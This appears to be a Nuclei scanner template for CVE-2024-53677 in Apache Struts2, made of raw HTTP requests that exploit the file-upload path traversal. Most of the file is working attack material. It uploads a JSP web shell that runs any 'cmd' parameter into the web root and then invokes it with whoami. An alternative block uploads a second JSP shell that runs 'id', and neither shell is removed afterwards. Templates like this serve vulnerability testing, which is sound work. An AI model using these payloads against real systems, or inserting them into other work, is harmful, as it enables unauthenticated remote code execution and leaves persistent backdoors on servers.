id: CVE-2024-53677

info:
  name: Apache Struts2 - File Upload Path Traversal RCE
  author: Trex
  severity: critical
  description: >
    File upload logic in Apache Struts2 is flawed. An attacker can manipulate file upload 
    parameters to enable path traversal and under some circumstances this can lead to 
    uploading a malicious file which can be used to perform Remote Code Execution.
    This vulnerability affects Apache Struts versions from 2.0.0 before 6.4.0.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-53677
    - https://cwiki.apache.org/confluence/display/WW/S2-067
    - https://github.com/apache/struts/security/advisories
  classification:
    cvss-metrics: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N
    cvss-score: 9.5
    cve-id: CVE-2024-53677
    cwe-id: CWE-22,CWE-434
  metadata:
    verified: true
    max-request: 3
    shodan-query: "Apache Struts"
  tags: cve,cve2024,apache,struts,struts2,fileupload,path-traversal,rce,unauth

variables:
  boundary: "----WebKitFormBoundary{{randstr}}"
  filename_traversal: "../../../webapps/ROOT/test{{randstr}}.jsp"
  malicious_content: "<%@ page import=\"java.io.*\" %><%if(request.getParameter(\"cmd\")!=null){String cmd=request.getParameter(\"cmd\");Process p=Runtime.getRuntime().exec(cmd);InputStream is=p.getInputStream();BufferedReader br=new BufferedReader(new InputStreamReader(is));String line;while((line=br.readLine())!=null){out.println(line);}}%>"

http:
  - raw:
      # First request - Check if Struts2 is present
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

      # Second request - Attempt file upload with path traversal
      - |
        POST /upload.action HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Content-Type: multipart/form-data; boundary={{boundary}}
        Content-Length: 500

        --{{boundary}}
        Content-Disposition: form-data; name="upload"; filename="{{filename_traversal}}"
        Content-Type: application/octet-stream

        {{malicious_content}}
        --{{boundary}}--

      # Third request - Try to access uploaded file
      - |
        GET /test{{randstr}}.jsp?cmd=whoami HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36

    req-condition: true
    matchers-condition: and
    matchers:
      - type: word
        part: body_1
        words:
          - "Apache Struts"
          - "struts"
          - "action"
          - "java"
        condition: or

      - type: status
        status:
          - 200
          - 302
          - 500

      - type: word
        part: body_2
        words:
          - "multipart"
          - "upload"
          - "file"
          - "success"
        condition: or
        negative: false

      - type: regex
        part: body_3
        regex:
          - "root|administrator|system|whoami"
          - "uid=[0-9]"
          - "gid=[0-9]"
        condition: or

    extractors:
      - type: regex
        name: struts_version
        part: body_1
        group: 1
        regex:
          - "Struts ([0-9.]+)"
          - "struts2?[/-]([0-9.]+)"

      - type: regex
        name: command_output
        part: body_3
        group: 1
        regex:
          - "([a-zA-Z0-9_-]+@[a-zA-Z0-9_-]+|root|administrator|system)"

      - type: kval
        part: body_2
        kval:
          - "success"
          - "upload"

# Alternative payloads for different endpoints
  - raw:
      - |
        POST /fileUpload.action HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary={{boundary}}
        Content-Length: 400

        --{{boundary}}
        Content-Disposition: form-data; name="file"; filename="../../webapps/ROOT/shell{{randstr}}.jsp"
        Content-Type: text/plain

        <%=new java.util.Scanner(Runtime.getRuntime().exec("id").getInputStream()).useDelimiter("\\A").next()%>
        --{{boundary}}--

      - |
        GET /shell{{randstr}}.jsp HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: regex
        part: body_2
        regex:
          - "uid=[0-9]+.*gid=[0-9]+"
          - "root.*root"
        condition: or

# Check for common Struts2 endpoints that might be vulnerable
  - raw:
      - |
        POST /struts/upload.action HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary={{boundary}}

        --{{boundary}}
        Content-Disposition: form-data; name="uploadFile"; filename="../../../tmp/test.txt"
        Content-Type: text/plain

        CVE-2024-53677 Test
        --{{boundary}}--

    matchers:
      - type: word
        part: body
        words:
          - "upload"
          - "successful"
          - "file"
          - "struts"
        condition: and

      - type: status
        status:
          - 200
          - 302